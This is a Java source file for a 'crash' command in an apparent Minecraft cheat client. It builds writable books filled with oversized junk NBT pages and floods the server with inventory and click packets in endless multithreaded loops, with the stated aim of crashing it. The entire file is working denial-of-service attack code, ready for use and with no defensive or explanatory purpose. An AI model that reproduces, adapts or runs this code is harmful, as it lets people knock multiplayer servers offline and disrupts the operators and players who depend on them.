package wtf.whess.meowware.client.main.commands.impl.crash;

import net.minecraft.init.Items;
import net.minecraft.inventory.ClickType;
import net.minecraft.item.ItemStack;
import net.minecraft.nbt.NBTTagCompound;
import net.minecraft.nbt.NBTTagList;
import net.minecraft.nbt.NBTTagString;
import net.minecraft.network.play.client.*;
import net.minecraft.util.EnumFacing;
import net.minecraft.util.EnumHand;
import net.minecraft.util.math.BlockPos;
import wtf.whess.meowware.client.api.utilities.client.ChatUtil;
import wtf.whess.meowware.client.main.commands.Command;

public final class Figure extends Command {
    public Figure() {
        super("Figure", "Figure Attack", "[ 1-4 ]", "figure", "fig");
    }

    @Override
    public void onCommand(String[] args, String command) {
        if (args.length > 0) {
            try {
                if (args[0].equalsIgnoreCase("1")) {
                    new Thread(() -> {
                        try {
                            ItemStack bookObj = new ItemStack(Items.WRITABLE_BOOK);
                            NBTTagList list = new NBTTagList();
                            NBTTagCompound tag = new NBTTagCompound();
                            String author = mc.getSession().getUsername();
                            for (int i = 0; i <= 50; ++i) {
                                String siteContent = "wveb54yn4y6y6hy6hb54yb5436by5346y3b4yb343yb453by45b34y5by34yb543yb54y5 h3y4h97,i567yb64t5vr2c43rc434v432tvt4tvybn4n6n57u6u57m6m6678mi68,867,79o,o97o,978iun7yb65453v4tyv34t4t3c2cc423rc334tcvtvt43tv45tvt5t5v43tv5345tv43tv5355vt5t3tv5t533v5t45tv43vt4355t54fwveb54yn4y6y6hy6hb54yb5436by5346y3b4yb343yb453by45b34y5by34yb543yb54y5 h3y4h97,i567yb64t5vr2c43rc434v432tvt4tvybn4n6n57u6u57m6m6678mi68,867,79o,o97o,978iun7yb65453v4tyv34t4t3c2cc423rc334tcvtvt43tv45tvt5t5v43tv5345tv43tv5355vt5t3tv5t533v5t45tv43vt4355t54fwveb54yn4y6y6hy6hb54yb5436by5346y3b4yb343yb453by45b34y5by34yb543yb54y5 h3y4h97,i567yb64t5";
                                NBTTagString tString = new NBTTagString(siteContent);
                                list.appendTag(tString);
                            } tag.setString("author", author);
                            tag.setString("title", "Title");
                            tag.setTag("pages", list);
                            bookObj.setTagInfo("pages", list);
                            bookObj.setTagCompound(tag);
                            while (true) {
                                mc.player.connection.sendPacket(new CPacketClickWindow(0, 0, 0, ClickType.PICKUP, bookObj, (short) 0));
                                Thread.sleep(12L);
                            }
                        } catch (Exception e) {
                            e.printStackTrace();
                        } ChatUtil.printChat("&2Attack!");
                    }).start();
                } else if (args[0].equalsIgnoreCase("2")) {
                    new Thread(() -> {
                        try {
                            ItemStack bookObj = new ItemStack(Items.WRITABLE_BOOK);
                            NBTTagList list = new NBTTagList();
                            NBTTagCompound tag = new NBTTagCompound();
                            String author = mc.getSession().getUsername();
                            for (int i = 0; i <= 50; ++i) {
                                String siteContent = "wveb54yn4y6y6hy6hb54yb5436by5346y3b4yb343yb453by45b34y5by34yb543yb54y5 h3y4h97,i567yb64t5vr2c43rc434v432tvt4tvybn4n6n57u6u57m6m6678mi68,867,79o,o97o,978iun7yb65453v4tyv34t4t3c2cc423rc334tcvtvt43tv45tvt5t5v43tv5345tv43tv5355vt5t3tv5t533v5t45tv43vt4355t54fwveb54yn4y6y6hy6hb54yb5436by5346y3b4yb343yb453by45b34y5by34yb543yb54y5 h3y4h97,i567yb64t5vr2c43rc434v432tvt4tvybn4n6n57u6u57m6m6678mi68,867,79o,o97o,978iun7yb65453v4tyv34t4t3c2cc423rc334tcvtvt43tv45tvt5t5v43tv5345tv43tv5355vt5t3tv5t533v5t45tv43vt4355t54fwveb54yn4y6y6hy6hb54yb5436by5346y3b4yb343yb453by45b34y5by34yb543yb54y5 h3y4h97,i567yb64t5";
                                NBTTagString tString = new NBTTagString(siteContent);
                                list.appendTag(tString);
                            } tag.setString("author", author);
                            tag.setString("title", "Title");
                            tag.setTag("pages", list);
                            bookObj.setTagInfo("pages", list);
                            bookObj.setTagCompound(tag);
                            while (true) {
                                mc.player.connection.sendPacket(new CPacketCreativeInventoryAction(36, bookObj));
                                Thread.sleep(12L);
                            }
                        } catch (Exception e) {
                            e.printStackTrace();
                        } ChatUtil.printChat("&2Attack!");
                    }).start();
                } else if (args[0].equalsIgnoreCase("3")) {
                    new Thread(() -> {
                        try {
                            ItemStack bookObj = new ItemStack(Items.WRITABLE_BOOK);
                            NBTTagList list = new NBTTagList();
                            NBTTagCompound tag = new NBTTagCompound();
                            String author = mc.getSession().getUsername();
                            for (int i = 0; i <= 50; ++i) {
                                String siteContent = "\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n";
                                NBTTagString tString = new NBTTagString(siteContent);
                                list.appendTag(tString);
                            } tag.setString("author", author);
                            tag.setString("title", "Title");
                            tag.setTag("pages", list);
                            bookObj.setTagInfo("pages", list);
                            bookObj.setTagCompound(tag);
                            mc.player.connection.sendPacket(new CPacketCreativeInventoryAction(1, bookObj));
                            mc.player.connection.sendPacket(new CPacketHeldItemChange(1));
                        } catch (Exception e) {
                            e.printStackTrace();
                        } ChatUtil.printChat("&2Attack!");
                    }).start();
                } else if (args[0].equalsIgnoreCase("4")) {
                    for (int idx = 0; idx <= 4; ++idx) {
                        new Thread(() -> {
                            try {
                                ItemStack bookObj = new ItemStack(Items.WRITABLE_BOOK);
                                NBTTagList list = new NBTTagList();
                                NBTTagCompound tag = new NBTTagCompound();
                                String author = mc.getSession().getUsername();
                                for (int i = 0; i <= 50; ++i) {
                                    String siteContent = "wveb54yn4y6y6hy6hb54yb5436by5346y3b4yb343yb453by45b34y5by34yb543yb54y5 h3y4h97,i567yb64t5vr2c43rc434v432tvt4tvybn4n6n57u6u57m6m6678mi68,867,79o,o97o,978iun7yb65453v4tyv34t4t3c2cc423rc334tcvtvt43tv45tvt5t5v43tv5345tv43tv5355vt5t3tv5t533v5t45tv43vt4355t54fwveb54yn4y6y6hy6hb54yb5436by5346y3b4yb343yb453by45b34y5by34yb543yb54y5 h3y4h97,i567yb64t5vr2c43rc434v432tvt4tvybn4n6n57u6u57m6m6678mi68,867,79o,o97o,978iun7yb65453v4tyv34t4t3c2cc423rc334tcvtvt43tv45tvt5t5v43tv5345tv43tv5355vt5t3tv5t533v5t45tv43vt4355t54fwveb54yn4y6y6hy6hb54yb5436by5346y3b4yb343yb453by45b34y5by34yb543yb54y5 h3y4h97,i567yb64t5";
                                    NBTTagString tString = new NBTTagString(siteContent);
                                    list.appendTag(tString);
                                } tag.setString("author", author);
                                tag.setString("title", "Title");
                                tag.setTag("pages", list);
                                bookObj.setTagInfo("pages", list);
                                bookObj.setTagCompound(tag);
                                while (true) {
                                    mc.player.connection.sendPacket(new CPacketCreativeInventoryAction(36, bookObj));
                                    Thread.sleep(8L);
                                }
                            } catch (Exception e) {
                                e.printStackTrace();
                            } ChatUtil.printChat("&2Attack!");
                        }).start();
                    }
                } else if (args[0].equalsIgnoreCase("5")) {
                    for (int idx = 0; idx <= 10; ++idx) {
                        new Thread(() -> {
                            try {
                                ItemStack bookObj = new ItemStack(Items.WRITABLE_BOOK);
                                NBTTagList list = new NBTTagList();
                                NBTTagCompound tag = new NBTTagCompound();
                                String author = mc.getSession().getUsername();
                                for (int i1 = 0; i1 <= 500; ++i1) {
                                    String siteContent = "wveb54yn4y6y6hy6hb54yb5436by5346y3b4yb343yb453by45b34y5by34yb543yb54y5 h3y4h97,i567yb64t5vr2c43rc434v432tvt4tvybn4n6n57u6u57m6m6678mi68,867,79o,o97o,978iun7yb65453v4tyv34t4t3c2cc423rc334tcvtvt43tv45tvt5t5v43tv5345tv43tv5355vt5t3tv5t533v5t45tv43vt4355t54fwveb54yn4y6y6hy6hb54yb5436by5346y3b4yb343yb453by45b34y5by34yb543yb54y5 h3y4h97,i567yb64t5vr2c43rc434v432tvt4tvybn4n6n57u6u57m6m6678mi68,867,79o,o97o,978iun7yb65453v4tyv34t4t3c2cc423rc334tcvtvt43tv45tvt5t5v43tv5345tv43tv5355vt5t3tv5t533v5t45tv43vt4355t54fwveb54yn4y6y6hy6hb54yb5436by5346y3b4yb343yb453by45b34y5by34yb543yb54y5 h3y4h97,i567yb64t5";
                                    NBTTagString tString = new NBTTagString(siteContent);
                                    list.appendTag(tString);
                                } tag.setString("author", author);
                                tag.setString("title", "Title");
                                tag.setTag("pages", list);
                                bookObj.setTagInfo("pages", list);
                                bookObj.setTagCompound(tag);
                                while (true) {
                                    for (int i2 = 0; i2 <= 8; ++i2) {
                                        mc.player.connection.sendPacket(new CPacketHeldItemChange(i2));
                                        mc.player.connection.sendPacket(new CPacketCreativeInventoryAction(36 + i2, bookObj));
                                        mc.player.connection.sendPacket(new CPacketEnchantItem(i2, 0));
                                        mc.player.connection.sendPacket(new CPacketPlayerDigging(CPacketPlayerDigging.Action.DROP_ALL_ITEMS, BlockPos.ORIGIN, EnumFacing.DOWN));
                                        mc.player.connection.sendPacket(new CPacketAnimation(EnumHand.MAIN_HAND));
                                        Thread.sleep(6L);
                                    }
                                }
                            } catch (Exception e) {
                                e.printStackTrace();
                            } ChatUtil.printChat("&2Attack!");
                        }).start();
                    }
                }
            } catch (Exception e) {
                ChatUtil.printChat("Error.");
                e.printStackTrace();
            }

        }
    }
}
